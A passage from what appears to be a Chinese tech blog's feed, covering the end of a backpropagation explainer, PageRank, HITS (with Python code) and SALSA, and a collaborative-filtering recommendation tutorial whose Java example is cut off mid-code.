<p><code>w_jk</code> 表示 <code>l</code> 层的第 <code>j</code> 个神经元与<code>(l-1)</code>层第 <code>k</code> 个神经元连线上的权重</p>    </blockquote>    <p>以 <strong>均方误差（MSE）</strong> 损失函数为例，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705190536.png" alt=""><br> 根据以上公式，就可以反向求出所有损失函数对所有参数的偏导了    </p>  </li>  <li>    <p><strong>矢量形式</strong>：</p>    <p>在标量形式的基础上，修改下标即可</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705190657.png" alt=""></p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705162428.png" alt=""></p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705162521.png" alt=""></p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180705162633.png" alt=""></p>    <p><strong>注意</strong>：其中向量相乘都是以<strong>按元素相乘</strong>的形式，一般用 <code>⊙</code> 符号表示。</p>  </li>  <li>    <p>以上是纯微积分形式的表达，一些机器学习相关书籍上总结了更简洁的形式，比如：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180705162841.png" alt=""></p>    <blockquote>      <p><a href="http://neuralnetworksanddeeplearning.com/chap2.html#the_four_fundamental_equations_behind_backpropagation" target="_blank" rel="noopener">The four fundamental equations behind backpropagation</a></p>    </blockquote>    <p><strong>注意</strong>：前两个公式为<strong>矢量形式</strong>，后两个具体到单个参数的是<strong>标量形式</strong>。</p>    <p>其中，符号 <code>⊙</code> 按元素相乘：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180705164018.png" alt=""></p>  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/8193f764/">http://home.meng.uno/articles/8193f764/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      1. 神经网络的结构
内容：

 * 神经网络是什么？
 * 神经网络的结构
 * 神经网络的工作机制
 * 深度学习中的“学习”指的是什么？
 * 神经网络的不足

示例：一个用于数字手写识别的神经网络



这个示例相当于深度学习领域中的 “Hello World”.

1.1. 神经元（隐藏单元）与隐藏层
神经元（隐藏单元）

 *  简单来说，神经元可以理解为一个用来装数字的容器，而这个数称为激活值
   
   需要强调的是，激活值的值域取决于使用的激活函数，大多数激活函数的值域都是正值
   
   
   
   

如果使用 sigmoid 激活函数，那么这个数字就在 0 到 
    
    </summary>
    
      <category term="Deep Learning" scheme="http://home.meng.uno/categories/Deep-Learning/"/>
    
    
      <category term="深度学习" scheme="http://home.meng.uno/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="AI" scheme="http://home.meng.uno/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>几个常见的社区推荐算法</title>
    <link href="http://home.meng.uno/articles/82a6b55c/"/>
    <id>http://home.meng.uno/articles/82a6b55c/</id>
    <published>2018-03-18T11:03:48.000Z</published>
    <updated>2020-12-02T02:10:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1>PageRank算法</h1><p>PageRank算法预先给每个网页一个PR值（PR值指代PageRank值），PR值在物理意义上为一个网页被访问的概率，所以一般是1/N，其中N为网页总数。</p><p>另外，所有网页的PR值的和一般为1。（如果实在不为1也不是不行，最后算出来的不同网页之间PR值的大小关系仍然是正确的，只是这个数值不能直接地反映概率罢了。）</p><p>接着，运用下面的算法不断迭代计算，直至达到平稳分布为止。</p><h2 id="普通情况">普通情况</h2><p><img src="http://www.meng.uno/images/recommend/13.jpg" alt=""></p><p>互联网中的众多网页可以看成一个有向图，箭头的指向即为链接的链入，根据上图，我们得到A的PR值为：PR(A)=PR(B)/2+PR©/1。</p><h2 id="没有出链">没有出链</h2><p><img src="http://www.meng.uno/images/recommend/14.jpg" alt=""></p><p>网络中不乏一些没有出链的网页，如上图，其中，网页C没有出链，也就是说网页C对其他网页没有PR值的贡献，我们不喜欢这种“自私”的网页（其实是为了满足 Markov 链的收敛性），于是设定其对所有网页（包括它自己）都有出链，则此图中A的PR值表示为：PR(A)=PR(B)/2+PR©/4。</p><h2 id="出链循环圈">出链循环圈</h2><p><img src="http://www.meng.uno/images/recommend/15.jpg" alt=""></p><p>网络中还存在这样的网页：只对自己有出链，或者几个网页的出链形成一个循环圈。那么在不断迭代的过程中，这一个或几个网页的PR值将只增不减，这显然是不合理的。</p><p>那么如何解决这个问题呢？我们假设某人正在浏览网页C，显然他不会一直停留在网页C，他可能会随机地输入一个网址从而去往另一个网页，并且其跳转到每个网页的概率是一样的。于是此图中A的PR值表示为：PR(A)=∂(PR(B)/2)+(1-∂)/4。</p><p>综上，一般情况下，一个网页的PR值计算公式如下：</p><p><img src="http://www.meng.uno/images/recommend/16.png" alt=""></p><p>其中，Mpi是所有对pi网页有出链的网页集合，L(pj)是网页pj的出链数目，N是网页总数，α一般取0.85。</p><p>根据上面的公式，我们就可以计算出每个网页的PR值，在不断迭代并趋于平稳的时候，即为最终结果。</p><h1>HITS算法</h1><p>算法简介：</p><p>首先把那些根据关键相关返回网页作为根集合S，再由S集合网页节点的链入和链出网页节点派生出结合C，结合C包括S，链入和链出节点集合。</p><p>C中的每个节点分配一对权重&lt;h(s),a(s)&gt;, 节点h(s)权重由节点链出的节点的a(s)决定，a(s)由节点的链入节点的h(s)决定。</p><p>算法过程：</p><p><img src="http://www.meng.uno/images/recommend/7.jpg" alt=""></p><p>网页的a权重向量：</p><p><img src="http://www.meng.uno/images/recommend/8.jpg" alt=""></p><p>关于HITS算法收敛性，可以从如下变换形式来得出：</p><p><img src="http://www.meng.uno/images/recommend/9.jpg" alt=""></p><p>当算法收敛时候，a其实就是对应矩阵A那个最大特征值对应的特征向量的归一化形式，同样，h也是H矩阵那个最大特征值对应的特征向量的归一化形式。</p><p>算法实现：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITSIterator</span>:</span></span><br><span class="line">    __doc__ = <span class="string">'''计算一张图中的hub,authority值'''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, dg)</span>:</span></span><br><span class="line">        self.max_iterations = <span class="number">100</span>  <span class="comment"># 最大迭代次数</span></span><br><span class="line">        self.min_delta = <span class="number">0.0001</span>  <span class="comment"># 确定迭代是否结束的参数</span></span><br><span class="line">        self.graph = dg</span><br><span class="line"></span><br><span class="line">        self.hub = &#123;&#125;</span><br><span class="line">        self.authority = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> self.graph.nodes():</span><br><span class="line">            self.hub[node] = <span class="number">1</span></span><br><span class="line">            self.authority[node] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        计算每个页面的hub,authority值</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.graph:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        flag = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.max_iterations):</span><br><span class="line">            change = <span class="number">0.0</span>  <span class="comment"># 记录每轮的变化值</span></span><br><span class="line">            norm = <span class="number">0</span>  <span class="comment"># 标准化系数</span></span><br><span class="line">            tmp = &#123;&#125;</span><br><span class="line">            <span class="comment"># 计算每个页面的authority值</span></span><br><span class="line">            tmp = self.authority.copy()</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> self.graph.nodes():</span><br><span class="line">                self.authority[node] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> incident_page <span class="keyword">in</span> self.graph.incidents(node):  <span class="comment"># 遍历所有“入射”的页面</span></span><br><span class="line">                    self.authority[node] += self.hub[incident_page]</span><br><span class="line">                norm += pow(self.authority[node], <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># 标准化</span></span><br><span class="line">            norm = sqrt(norm)</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> self.graph.nodes():</span><br><span class="line">                self.authority[node] /= norm</span><br><span class="line">                change += abs(tmp[node] - self.authority[node])</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算每个页面的hub值</span></span><br><span class="line">            norm = <span class="number">0</span></span><br><span class="line">            tmp = self.hub.copy()</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> self.graph.nodes():</span><br><span class="line">                self.hub[node] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> neighbor_page <span class="keyword">in</span> self.graph.neighbors(node):  <span class="comment"># 遍历所有“出射”的页面</span></span><br><span class="line">                    self.hub[node] += self.authority[neighbor_page]</span><br><span class="line">                norm += pow(self.hub[node], <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># 标准化</span></span><br><span class="line">            norm = sqrt(norm)</span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> self.graph.nodes():</span><br><span class="line">                self.hub[node] /= norm</span><br><span class="line">                change += abs(tmp[node] - self.hub[node])</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"This is NO.%s iteration"</span> % (i + <span class="number">1</span>))</span><br><span class="line">            print(<span class="string">"authority"</span>, self.authority)</span><br><span class="line">            print(<span class="string">"hub"</span>, self.hub)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> change &lt; self.min_delta:</span><br><span class="line">                flag = <span class="keyword">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"finished in %s iterations!"</span> % (i + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"finished out of 100 iterations!"</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"The best authority page: "</span>, max(self.authority.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>]))</span><br><span class="line">        print(<span class="string">"The best hub page: "</span>, max(self.hub.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    dg = digraph()</span><br><span class="line"></span><br><span class="line">    dg.add_nodes([<span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>])</span><br><span class="line"></span><br><span class="line">    dg.add_edge((<span class="string">"A"</span>, <span class="string">"C"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"A"</span>, <span class="string">"D"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"B"</span>, <span class="string">"D"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"C"</span>, <span class="string">"E"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"D"</span>, <span class="string">"E"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"B"</span>, <span class="string">"E"</span>))</span><br><span class="line">    dg.add_edge((<span class="string">"E"</span>, <span class="string">"A"</span>))</span><br><span class="line"></span><br><span class="line">    hits = HITSIterator(dg)</span><br><span class="line">    hits.hits()</span><br></pre>      </td>    </tr>  </table></figure><h1>SALSA算法</h1><p>SALSA算法和HITS算法初始部分一样，构建相同的集合集C和彼此的链接关系。</p><p>SALSA一种随机游走过程，但是不同经典的随机游走。它涉及到把一个网页节点看成2种不同类型节点：hub和authority，随机游走对应着这样两种不用类型的Markov链：hub链和authority链，状态转移为网页前向和后向。</p><p><img src="http://www.meng.uno/images/recommend/10.jpg" alt=""></p><p>首先是把构建一个无向图，原图节点分为2类，然后构建边。</p><p>这样从某个节点出发，进行两个方向的随机游走。h和a方向的状态转移矩阵：</p><p><img src="http://www.meng.uno/images/recommend/11.jpg" alt=""></p><p>对于以上的形式可以通过如下的矩阵相乘的方式展现：</p><p><img src="http://www.meng.uno/images/recommend/12.jpg" alt=""></p><p>有了H和A矩阵，就可以知道节点集合最终的h和a向量：和HITS一样，h和a对应H和A的最大特征值对应的归一化特征向量。其实，计算h和a可以参照HITS，进行迭代求解。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/82a6b55c/">http://home.meng.uno/articles/82a6b55c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      PageRank算法
PageRank算法预先给每个网页一个PR值（PR值指代PageRank值），PR值在物理意义上为一个网页被访问的概率，所以一般是1/N，其中N为网页总数。

另外，所有网页的PR值的和一般为1。（如果实在不为1也不是不行，最后算出来的不同网页之间PR值的大小关系仍然是正确的，只是这个数值不能直接地反映概率罢了。）

接着，运用下面的算法不断迭代计算，直至达到平稳分布为止。

普通情况


互联网中的众多网页可以看成一个有向图，箭头的指向即为链接的链入，根据上图，我们得到A的PR值为：PR(A)=PR(B)/2+PR©/1。

没有出链


网络中不乏一些没有出链的网页，
    
    </summary>
    
      <category term="Data Mining" scheme="http://home.meng.uno/categories/Data-Mining/"/>
    
    
      <category term="推荐" scheme="http://home.meng.uno/tags/%E6%8E%A8%E8%8D%90/"/>
    
      <category term="社交网络" scheme="http://home.meng.uno/tags/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>商品推荐：协同过滤</title>
    <link href="http://home.meng.uno/articles/6f93935a/"/>
    <id>http://home.meng.uno/articles/6f93935a/</id>
    <published>2018-03-17T06:05:52.000Z</published>
    <updated>2020-12-02T02:03:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>过去很长时间以及现今，电商都在蓬勃发展，支持电商越做越大的一个很重要的因素就是“商品推荐”。当我们打开天猫，我们发现不同的用户，一般而言，首页是不一样的，原因就是，它为不同的用户推荐了不同的商品。我们为什么要用某一个购物网站或者APP，我觉得很大程度上取决于其推荐的准确与否。本篇博客我将向大家介绍协同过滤在商品推荐上的应用。</p></blockquote><h1>关于推荐系统</h1><p>根据推荐引擎的数据源不同，一般而言，推荐系统可以分为如下三类：</p><ul>  <li>基于人口统计学的推荐机制（Demographic-based Recommendation）：根据系统用户的基本信息发现用户的相关程度。</li></ul><p><img src="http://www.meng.uno/images/recommend/6.jpg" alt=""></p><ul>  <li>基于内容的推荐机制（Content-based Recommendation）：根据推荐物品或内容的元数据，发现物品或者内容的相关性。</li></ul><p><img src="http://www.meng.uno/images/recommend/3.jpg" alt=""></p><ul>  <li>协同过滤的推荐机制（Collaborative Filtering-based Recommendation）：根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性。</li></ul><p>根据推荐模型的建立方式不同，推荐系统可以分为这样三类：</p><ul>  <li>基于物品和用户本身。这种推荐引擎将每个用户和每个物品都当作独立的实体，预测每个用户对于每个物品的喜好程度，这些信息往往是用一个二维矩阵描述的。由于用户感兴趣的物品远远小于总物品的数目，这样的模型导致大量的数据空置，即我们得到的二维矩阵往往是一个很大的稀疏矩阵。同时为了减小计算量，我们可以对物品和用户进行聚类， 然后记录和计算一类用户对一类物品的喜好程度，但这样的模型又会在推荐的准确性上有损失。</li>  <li>基于关联规则的推荐（Rule-based Recommendation）。关联规则的挖掘已经是数据挖掘中的一个经典的问题，主要是挖掘一些数据的依赖关系，典型的场景就是“购物篮问题”，通过关联规则的挖掘，我们可以找到哪些物品经常被同时购买，或者用户购买了一些物品后通常会购买哪些其他的物品，当我们挖掘出这些关联规则之后，我们可以基于这些规则给用户进行推荐。</li>  <li>基于模型的推荐（Model-based Recommendation）。这是一个典型的机器学习的问题，可以将已有的用户喜好信息作为训练样本，训练出一个预测用户喜好的模型，这样以后用户在进入系统，可以基于此模型计算推荐。这种方法的问题在于如何将用户实时或者近期的喜好信息反馈给训练好的模型，从而提高推荐的准确度。</li></ul><h1>协同过滤</h1><p>关于协同过滤的一个最经典的例子就是看电影，有时候不知道哪一部电影是我们喜欢的或者评分比较高的，那么通常的做法就是问问周围的朋友，看看最近有什么好的电影推荐。在问的时候，都习惯于问跟自己口味差不多的朋友，这就是协同过滤的核心思想。</p><h2 id="步骤">步骤</h2><p>要实现协同过滤，一般需要这样三步：</p><ul>  <li>收集用户偏好</li>  <li>找到相似物或人</li>  <li>计算并推荐</li></ul><h3 id="收集用户偏好">收集用户偏好</h3><p>从用户的行为和偏好中发现规律，并基于此进行推荐，所以如何收集用户的偏好信息成为系统推荐效果最基础的决定因素。用户有很多种方式向系统提供自己的偏好信息，比如：评分，投票，转发，保存书签，购买，点击流，页面停留时间等等。</p><p>当然，得到原始数据之后，我们总是需要进行降噪、归一化等，在此不再赘述。</p><h3 id="找到相似物或人">找到相似物或人</h3><p>既然是找相似，我们就需要设定一个计算相似度的指标，一般而言，余弦相似度与皮尔逊相关系数是很好的选择。</p><h4 id="余弦相似度">余弦相似度</h4><p><img src="http://www.meng.uno/images/recommend/4.gif" alt=""></p><h4 id="皮尔逊相关系数">皮尔逊相关系数</h4><p>皮尔逊相关也称为积差相关（或积矩相关）是英国统计学家皮尔逊于20世纪提出的一种计算直线相关的方法。</p><p>假设有两个变量X、Y，那么两变量间的皮尔逊相关系数可通过以下公式计算：</p><p><img src="http://www.meng.uno/images/recommend/5.gif" alt=""></p><h3 id="计算并推荐">计算并推荐</h3><ul>  <li>基于用户的协同过滤推荐</li></ul><p>基于用户的协同过滤推荐的基本原理是，根据所有用户对物品或者信息的偏好，发现与当前用户口味和偏好相似的“邻居”用户群，在一般的应用中是采用计算“K- 邻居”的算法；然后，基于这 K 个邻居的历史偏好信息，为当前用户进行推荐。</p><p><img src="http://www.meng.uno/images/recommend/1.jpg" alt=""></p><p>上图示意出基于用户的协同过滤推荐机制的基本原理，假设用户 A 喜欢物品 A，物品 C，用户 B 喜欢物品 B，用户 C 喜欢物品 A ，物品 C 和物品 D；从这些用户的历史喜好信息中，我们可以发现用户 A 和用户 C 的口味和偏好是比较类似的，同时用户 C 还喜欢物品 D，那么我们可以推断用户 A 可能也喜欢物品 D，因此可以将物品 D 推荐给用户 A。</p><p>基于用户的协同过滤推荐机制和基于人口统计学的推荐机制都是计算用户的相似度，并基于“邻居”用户群计算推荐，但它们所不同的是如何计算用户的相似度，基于人口统计学的机制只考虑用户本身的特征，而基于用户的协同过滤机制可是在用户的历史偏好的数据上计算用户的相似度，它的基本假设是，喜欢类似物品的用户可能有相同或者相似的口味和偏好。</p><ul>  <li>基于项目的协同过滤推荐</li></ul><p>基于项目的协同过滤推荐的基本原理也是类似的，只是说它使用所有用户对物品或者信息的偏好，发现物品和物品之间的相似度，然后根据用户的历史偏好信息，将类似的物品推荐给用户。</p><p><img src="http://www.meng.uno/images/recommend/2.jpg" alt=""></p><p>假设用户 A 喜欢物品 A 和物品 C，用户 B 喜欢物品 A，物品 B 和物品 C，用户 C 喜欢物品 A，从这些用户的历史喜好可以分析出物品 A 和物品 C 时比较类似的，喜欢物品 A 的人都喜欢物品 C，基于这个数据可以推断用户 C 很有可能也喜欢物品 C，所以系统会将物品 C 推荐给用户 C。</p><p>与上面讲的类似，基于项目的协同过滤推荐和基于内容的推荐其实都是基于物品相似度预测推荐，只是相似度计算的方法不一样，前者是从用户历史的偏好推断，而后者是基于物品本身的属性特征信息。</p><ul>  <li>基于模型的协同过滤推荐</li></ul><p>基于模型的协同过滤推荐就是基于样本的用户喜好信息，训练一个推荐模型，然后根据实时的用户喜好的信息进行预测，计算推荐。</p><p>基于协同过滤的推荐机制是现今应用最为广泛的推荐机制，它有以下几个显著的优点：</p><p>它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，所以这种方法也是领域无关的。 这种方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好 而它也存在以下几个问题：</p><p>方法的核心是基于历史数据，所以对新物品和新用户都有“冷启动”的问题。 推荐的效果依赖于用户历史偏好数据的多少和准确性。 在大部分的实现中，用户历史偏好是用稀疏矩阵进行存储的，而稀疏矩阵上的计算有些明显的问题，包括可能少部分人的错误偏好会对推荐的准确度有很大的影响等等。 对于一些特殊品味的用户不能给予很好的推荐。 由于以历史数据为基础，抓取和建模用户的偏好后，很难修改或者根据用户的使用演变，从而导致这个方法不够灵活。</p><h2 id="代码实现">代码实现</h2><p>基于用户的CF：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 基于用户的协同过滤推荐算法实现 </span></span><br><span class="line"><span class="comment">A a b d </span></span><br><span class="line"><span class="comment">B a c </span></span><br><span class="line"><span class="comment">C b e </span></span><br><span class="line"><span class="comment">D c d e </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Administrator </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserCF</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">   * 输入用户--&gt;物品条目 一个用户对应多个物品 </span></span><br><span class="line"><span class="comment">   * 用户ID 物品ID集合 </span></span><br><span class="line"><span class="comment">   * A  a b d </span></span><br><span class="line"><span class="comment">   * B  a c </span></span><br><span class="line"><span class="comment">   * C  b e </span></span><br><span class="line"><span class="comment">   * D  c d e </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"Input the total users number:"</span>);</span><br><span class="line"><span class="comment">//输入用户总量 </span></span><br><span class="line"><span class="keyword">int</span> N = scanner.nextint();</span><br><span class="line"><span class="keyword">int</span>[][] sparseMatrix = <span class="keyword">new</span> <span class="keyword">int</span>[N][N];</span><br><span class="line"><span class="comment">//建立用户稀疏矩阵，用于用户相似度计算【相似度矩阵】 </span></span><br><span class="line">Map&lt;String, Integer&gt; userItemLength = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//存储每一个用户对应的不同物品总数 eg: A 3 </span></span><br><span class="line">Map&lt;String, Set&lt;String&gt;&gt; itemUserCollection = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//建立物品到用户的倒排表 eg: a A B </span></span><br><span class="line">Set&lt;String&gt; items = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"><span class="comment">//辅助存储物品集合 </span></span><br><span class="line">Map&lt;String, Integer&gt; userID = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//辅助存储每一个用户的用户ID映射 </span></span><br><span class="line">Map&lt;Integer, String&gt; idUser = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//辅助存储每一个ID对应的用户映射 </span></span><br><span class="line">System.out.println(<span class="string">"Input user--items maping infermation:&lt;eg:A a b d&gt;"</span>);</span><br><span class="line">scanner.nextLine();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N ; i++)&#123;</span><br><span class="line"><span class="comment">//依次处理N个用户 输入数据 以空格间隔 </span></span><br><span class="line">String[] user_item = scanner.nextLine().split(<span class="string">" "</span>);</span><br><span class="line"><span class="keyword">int</span> length = user_item.length;</span><br><span class="line">userItemLength.put(user_item[<span class="number">0</span>], length-<span class="number">1</span>);</span><br><span class="line"><span class="comment">//eg: A 3 </span></span><br><span class="line">userID.put(user_item[<span class="number">0</span>], i);</span><br><span class="line"><span class="comment">//用户ID与稀疏矩阵建立对应关系 </span></span><br><span class="line">idUser.put(i, user_item[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//建立物品--用户倒排表 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; length; j ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(items.contains(user_item[j]))&#123;</span><br><span class="line"><span class="comment">//如果已经包含对应的物品--用户映射，直接添加对应的用户 </span></span><br><span class="line">itemUserCollection.get(user_item[j]).add(user_item[<span class="number">0</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//否则创建对应物品--用户集合映射 </span></span><br><span class="line">items.add(user_item[j]);</span><br><span class="line">itemUserCollection.put(user_item[j], <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line"><span class="comment">//创建物品--用户倒排关系 </span></span><br><span class="line">itemUserCollection.get(user_item[j]).add(user_item[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 